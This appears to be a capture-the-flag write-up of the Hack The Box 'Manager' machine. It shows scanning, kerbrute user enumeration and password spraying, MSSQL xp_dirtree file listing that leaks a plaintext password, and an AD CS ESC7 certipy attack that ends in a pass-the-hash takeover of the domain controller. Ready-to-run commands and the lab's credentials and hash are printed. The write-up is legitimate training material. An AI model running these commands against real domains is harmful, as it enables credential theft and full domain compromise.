@@ -1,0 +1,545 @@
+---
+tags:
+  - AD-CS
+  - kerbrute
+  - mssql
+  - xp_dirtree
+  - ESC7
+  - certipy
+---
+# HTB: Manager
+
+***Overview**: Manager is a Medium rated HTB Machine that utilizes ability to use the xp_dirtree stored procedure to list files and directories in a MSSQL server to retrieve a configuration file containing credentials and obtain foothold. Then the machine exploits the dangerous ManageCA permissions given to non-admin user to assign ManageCertificates rights and uses these rights to conduct a successful ESC7 attack to approve denied certificates that can then be used to retrieve a TGT and a hash that would be use to gain DA on the DC.*
+## Scanning and Enumeration
+
+- so we start with a port scan to identify open ports
+
+```shell
+──(gr4y㉿kali)-[~/HTB/Manager]
+└─$ sudo masscan -p1-65535 10.10.11.236 --rate=1000 -e tun0 > ports
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-12-23 13:29:56 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+                                                                                                                                                                                                                                             
+┌──(gr4y㉿kali)-[~/HTB/Manager]
+└─$ cat ports
+Discovered open port 49667/tcp on 10.10.11.236                                 
+Discovered open port 9389/tcp on 10.10.11.236                                  
+Discovered open port 593/tcp on 10.10.11.236                                   
+Discovered open port 389/tcp on 10.10.11.236                                   
+Discovered open port 88/tcp on 10.10.11.236                                    
+Discovered open port 49673/tcp on 10.10.11.236                                 
+Discovered open port 464/tcp on 10.10.11.236                                   
+Discovered open port 445/tcp on 10.10.11.236                                   
+Discovered open port 139/tcp on 10.10.11.236                                   
+Discovered open port 49674/tcp on 10.10.11.236                                 
+Discovered open port 135/tcp on 10.10.11.236                                   
+Discovered open port 49734/tcp on 10.10.11.236                                 
+Discovered open port 3268/tcp on 10.10.11.236                                  
+Discovered open port 53/tcp on 10.10.11.236                                    
+Discovered open port 1433/tcp on 10.10.11.236                                  
+Discovered open port 80/tcp on 10.10.11.236                                    
+Discovered open port 5985/tcp on 10.10.11.236                                  
+Discovered open port 52341/tcp on 10.10.11.236                                 
+Discovered open port 636/tcp on 10.10.11.236                                   
+Discovered open port 49675/tcp on 10.10.11.236                                 
+Discovered open port 51010/tcp on 10.10.11.236                                 
+Discovered open port 3269/tcp on 10.10.11.236                                  
+                                                                                                                                                                                                                                             
+┌──(gr4y㉿kali)-[~/HTB/Manager]
+└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+```
+
+- then we identify the services running on the open ports, from these services we can see that it is a DC
+
+```shell
+┌──(gr4y㉿kali)-[~/HTB/Manager]
+└─$ sudo nmap -p$ports -sC -sV -oA nmap/manager 10.10.11.236 -v    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 08:34 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 08:34
+Completed NSE at 08:34, 0.00s elapsed
+Initiating NSE at 08:34
+Completed NSE at 08:34, 0.00s elapsed
+Initiating NSE at 08:34
+Completed NSE at 08:34, 0.00s elapsed
+Initiating Ping Scan at 08:34
+Scanning 10.10.11.236 [4 ports]
+Completed Ping Scan at 08:34, 0.34s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 08:34
+Scanning manager.htb (10.10.11.236) [22 ports]
+Discovered open port 53/tcp on 10.10.11.236
+Discovered open port 135/tcp on 10.10.11.236
+Discovered open port 139/tcp on 10.10.11.236
+Discovered open port 445/tcp on 10.10.11.236
+Discovered open port 49673/tcp on 10.10.11.236
+Discovered open port 49667/tcp on 10.10.11.236
+Discovered open port 80/tcp on 10.10.11.236
+Discovered open port 1433/tcp on 10.10.11.236
+Discovered open port 5985/tcp on 10.10.11.236
+Discovered open port 88/tcp on 10.10.11.236
+Discovered open port 49734/tcp on 10.10.11.236
+Discovered open port 49674/tcp on 10.10.11.236
+Discovered open port 389/tcp on 10.10.11.236
+Discovered open port 636/tcp on 10.10.11.236
+Discovered open port 464/tcp on 10.10.11.236
+Discovered open port 51010/tcp on 10.10.11.236
+Discovered open port 3269/tcp on 10.10.11.236
+Discovered open port 3268/tcp on 10.10.11.236
+Discovered open port 49675/tcp on 10.10.11.236
+Discovered open port 9389/tcp on 10.10.11.236
+Discovered open port 593/tcp on 10.10.11.236
+Completed SYN Stealth Scan at 08:34, 2.11s elapsed (22 total ports)
+Initiating Service scan at 08:34
+Scanning 21 services on manager.htb (10.10.11.236)
+Completed Service scan at 08:35, 59.55s elapsed (21 services on 1 host)
+NSE: Script scanning 10.10.11.236.
+Initiating NSE at 08:35
+Completed NSE at 08:35, 40.21s elapsed
+Initiating NSE at 08:35
+Completed NSE at 08:36, 5.77s elapsed
+Initiating NSE at 08:36
+Completed NSE at 08:36, 0.00s elapsed
+Nmap scan report for manager.htb (10.10.11.236)
+Host is up (0.23s latency).
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Manager
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-23 20:34:26Z)
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-12-23T20:36:03+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+|_ssl-date: 2023-12-23T20:36:00+00:00; +7h00m01s from scanner time.
+1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-12-23T18:01:35
+| Not valid after:  2053-12-23T18:01:35
+| MD5:   8072:b2d7:5093:907c:27da:64e1:ba5e:7ec8
+|_SHA-1: a4f7:36ff:929e:490f:e157:790f:00b2:c465:cc41:7532
+| ms-sql-ntlm-info: 
+|   10.10.11.236:1433: 
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.10.11.236:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2023-12-23T20:36:03+00:00; +7h00m01s from scanner time.
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-12-23T20:36:03+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-12-23T20:36:00+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49667/tcp open     msrpc         Microsoft Windows RPC
+49673/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open     msrpc         Microsoft Windows RPC
+49675/tcp open     msrpc         Microsoft Windows RPC
+49734/tcp open     msrpc         Microsoft Windows RPC
+51010/tcp open     msrpc         Microsoft Windows RPC
+52341/tcp filtered unknown
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+| smb2-time: 
+|   date: 2023-12-23T20:35:20
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 08:36
+Completed NSE at 08:36, 0.00s elapsed
+Initiating NSE at 08:36
+Completed NSE at 08:36, 0.00s elapsed
+Initiating NSE at 08:36
+Completed NSE at 08:36, 0.00s elapsed
+```
+
+### port 88
+
+- Using kerbrute and the rockyou.txt file, we were able to obtain some users
+
+![](assets/Manager_assets/Pasted%20image%2020231230154323.png)
+
+- since rockyou wordlist is very large, we can use other wordlists, a really good set of wordlists is the the statistically-likely-usernames at  [GitHub - insidetrust/statistically-likely-usernames: Wordlists for creating statistically likely username lists for use in password attacks and security testing](https://github.com/insidetrust/statistically-likely-usernames), like using the service-accounts wordlists there we got the users 
+
+![](assets/Manager_assets/Pasted%20image%2020231223120715.png)
+
+- so to find valid password, we tried using the userlist as our password list, this is a common password mistake, especially when it comes to service accounts, and we were able to identify a valid password for the operator user with crackmapexec
+Crackmapexec cheatsheet [Offensive Security Cheatsheet (haax.fr)](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
+
+![](assets/Manager_assets/Pasted%20image%2020231223120651.png)
+
+- as we can see above we were able to enumerate more users with crackmapexec with those credentials
+
+## Foothold
+### Mssql : port 1433
+
+- so using our newly found credentials, got access to the mssql server using impacket-mssqlclient, but we have really low privileges as the operator user
+
+```shell
+impacket-mssqlclient -p 1433 manager.htb/operator:operator@10.10.11.236 -windows-auth
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223140400.png)
+
+- or we can use sqsh to access the mssql database
+
+```shell
+sqsh -S 10.10.11.236 -U .\\operator -P operator -D msdb
+```
+- so now that we have access, we can enumerate the information on the database using commands like below
+Resource: [MSSQL (Microsoft SQL) Pentesting | Exploit Notes (hdks.org)](https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/)
+
+```shell
+enum_db # enumerate the databases in the server
+USE msdb # switch to the msdb database
+SELECT * FROM msdb.INFORMATION_SCHEMA.TABLES; #list all the tables in the msdb database
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231230151334.png)
+
+- the command below would give same output with enum_db
+
+```shell
+SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;
+```
+
+- we can also list the columns in the database, lets say we want to list the columns in the backupfile table, we can do
+
+```shell
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘backupfile’);
+```
+
+- so if we try to run the `xp_cmdshell` but we can see we don't have permission to, and we also don't have the permission to enable it either
+
+![](assets/Manager_assets/Pasted%20image%2020231230152103.png)
+
+```ad-info
+the `xp_cmdshell` command is a stored procedure that allows us to issue OS commands directly on our mssql server
+```
+
+- so we can try to see if we can list files on the base system using the `xp_dirtree` command
+
+```ad-info
+the `xp_dirtree` command is a stored procedure that can be used to list all the files and directories in a given directory
+```
+
+- so to view files in the root directory `C:\` we will run
+
+```shell
+EXEC xp_dirtree 'C:\', 1, 1
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231230153259.png)
+
+the second argument in the `xp_dirtree` is to specify the depth we want to go so 1 means the sub directories one dept, and the second argument is to specify that files should be shown as well not just directories (0 is for just directories)
+
+Resource: [How to Use xp_dirtree to List All Files in a Folder – SQLServerCentral](https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder)
+
+- so after looking through, we saw some files in the `wwwroot` directory which is where our web server is hosted and the files are located
+
+```shell
+EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223140205.png)
+
+- so the we download the interesting backup file by navigating to the directory
+
+![](assets/Manager_assets/Pasted%20image%2020231223141216.png)
+![](assets/Manager_assets/Pasted%20image%2020231223141305.png)
+
+- then we unzip the file and we can see we have some html files, css files, js files and we can see an interesting .old-conf.xml file
+
+![](assets/Manager_assets/Pasted%20image%2020231223141333.png)
+
+- so if we view the file, we get a password for the raven user
+
+![](assets/Manager_assets/Pasted%20image%2020231223141201.png)
+
+```
+  <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+
+```
+
+- we can see that we do have a set of valid credentials and we can access them with winrm
+
+![](assets/Manager_assets/Pasted%20image%2020231223150340.png)
+
+- so we gain access using winrm as raven
+
+![](assets/Manager_assets/Pasted%20image%2020231223191546.png)
+
+- and we can view our user flag
+
+![](assets/Manager_assets/Pasted%20image%2020231223191630.png)
+
+## Domain Privilege Escalation - ESC7: Vulnerable CA Access Control
+
+- we can check for who we are and what privileges we have
+
+```shell
+*Evil-WinRM* PS C:\Users\Raven\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ==============================================
+manager\raven S-1-5-21-4078382237-1492182817-2568127209-1116
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+```
+
+- so we can see that AD CS is running on our DC (Certificate service), so lets try to find some vulnerable certificate templates using certipy, the output will be saved in the txt and json files. we also have a bloodhound data that we can load as well
+
+```shell
+certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223191314.png)
+
+- so looking at the text file, we will- notice that we have just a CA which is the manager-DC01-CA and we can see that our user Raven has dangerous permissions and the target is vulnerable to the ESC7 attack. We don't have vulnerable certificate templates but we do have dangerous permissions
+
+![](assets/Manager_assets/Pasted%20image%2020231230155318.png)
+
+```ad-summary
+A Little Background
+- CA's have authorities too right, the main access rights for our security focus  are Manage CA and  Manage Certificates  which are the CA administrator and Certificate manager(CA Officer) respectively
+- for the ManageCA, if an individual has the Manage CA rights over a Certificate Authority,  the person can flip the value of (that EDIT_ATTRIBUTEALTNAME2 flag, ESC6) i.e. to allow SAN (Subject alternative name) specification in a template(this one means for any CA that has that flag set, any template that allows unprivileged users to enroll, those users can define their own values for the SAN, which can be abused to allow that user to authenticate to a domain as another user  (a domain admin)).
+- For the case above, this will not work tho until the service is restarted, but the problem is that doesn't mean we can start it remotely
+- Now for the CA Ofiicer(manage certificates): there is a method that resubmits a pending or denied certificate, thereby causing the Certificate to be approved remotely using Officer Rights, approving these certificates remotely, allows one to bypass the CA certificate manager approval protection
+- so another attack scenario since we cant restart the service:
+Prerequisites:
+1. we need just the ManageCA permission then the Manage Certificates right can then be granted from the ManageCA permission
+2. another prerequisite is the SubCA template must be enabled, and this can also be enabled using the ManageCA permission (but in our case this is already enabled)
+- In this technique, it relies on users with the ManageCA and ManageCertificate rights can issue failed certificates
+- Now the SubSA template is only available to administrators, so the user will request this certificate and the request will be denied and then it will be issued by the manager(officer) after
+
+LETS SEE HOW!!
+```
+
+```ad-note
+think of snap-ins as the tools and MMC as the toolbox 
+```
+
+- so first since we have the `ManageCA` rights as raven, we can give ourselves the `ManageCertificates` rights by adding ourselves as a CA Officer, we can do this with certipy
+
+```shell
+certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223163418.png)
+
+- and that was successful as seen above
+- so now as per the second requirement is for SubCA template to be enabled, but we already have this enabled, and we can see it in out text file
+
+![](assets/Manager_assets/Pasted%20image%2020231230160721.png)
+
+- but if it wasn't enabled, we would enable it with the command
+
+```shell
+certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA'
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223163837.png)
+
+- now we want to request a certificate using the SubCA certificate using the command below, but it will obviously get denied because we are not administrator so we can't use the template. but we save the private key (14.key)and take note of the Request ID (14)
+
+```shell
+certipy req -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223164626.png)
+
+- then using certipy, we can then issue the failed certificate users, and this is because we have the `ManageCA` and `ManageCertificates` rights. so we do this by specifying the Request ID of the request that was denied
+
+```shell
+certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -issue-request 14 
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223164956.png)
+
+> NOTE: The machine keeps resetting all the configurations, so it removes Raven as an officer, so we have to run the commands quickly together so we can issue the certificate
+
+![](assets/Manager_assets/Pasted%20image%2020231223165034.png)
+
+- Now that we have successfully issued the certificate, we can then retrieve it and we can do that using certipy (it loads the private key we saved), Now we have the certificate and the private key.
+
+```shell
+certipy req -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -retrieve 14
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223165229.png)
+
+- Now we can use this certificate to try and retrieve a TGT
+
+```shell
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.23
+```
+
+- but we get an error about our clock skew being too great
+
+![](assets/Manager_assets/Pasted%20image%2020231223190104.png)
+
+```ad-note
+Clockskew is the time difference between the clocks of 2 computes , In Kerberos, its is important to ensure that the clocks of participating  entities(kerberos clients, servers, and KDC) are synchronised cause lets say oif a ticket is meant to expire and the clocks are not synchronised then an attacker can use an already expired ticket.
+```
+
+- so we can sync our clock with that of the DC by running the command
+
+```shell
+sudo ntpdate 10.10.11.236
+```
+
+- now we can successfully get a TGT and also the hash of the admin user
+
+```shell
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231223190248.png)
+
+```
+aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+```
+
+- and we verify if we can access using the hash and we see we can
+
+```shell
+└─$ crackmapexec smb 10.10.11.236 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef'
+
+```
+
+![](assets/Manager_assets/Pasted%20image%2020231224181850.png)
+
+- So can use this hash to finally gain access as DA and we have fully compromised the DC!!
+
+![](assets/Manager_assets/Pasted%20image%2020231223191357.png)
+
+![](assets/Manager_assets/Pasted%20image%2020231223191447.png)
+
+
+## Resources
+
+- [Certified Pre-Owned. Active Directory Certificate Services… | by Will Schroeder | Posts By SpecterOps Team Members](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- [Certified_Pre-Owned.pdf (specterops.io)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [AD CS Domain Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
+- [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
+- [GitHub - arth0sz/Practice-AD-CS-Domain-Escalation: Introductory guide on the configuration and subsequent exploitation of Active Directory Certificate Services with Certipy. Based on the white paper Certified Pre-Owned.](https://github.com/arth0sz/Practice-AD-CS-Domain-Escalation#vulnerable-certificate-authority-access-control---esc7)
+
+
+
+we can also do this  with Certify [AD CS: weaponizing the ESC7 attack | BlackArrow - Tarlogic](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)
+
+read about the wordlist in
+[Active Directory Enumeration & Attacks - HTB Academy (CPTS) (gitbook.io)](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks)
+
+
+```
+for pass in $(cat /usr/share/wordlists/rockyou.txt); do ./kerbrute_linux_amd64 passwordspray --dc 10.10.11.236 -d manager.htb users.txt $pass
+```
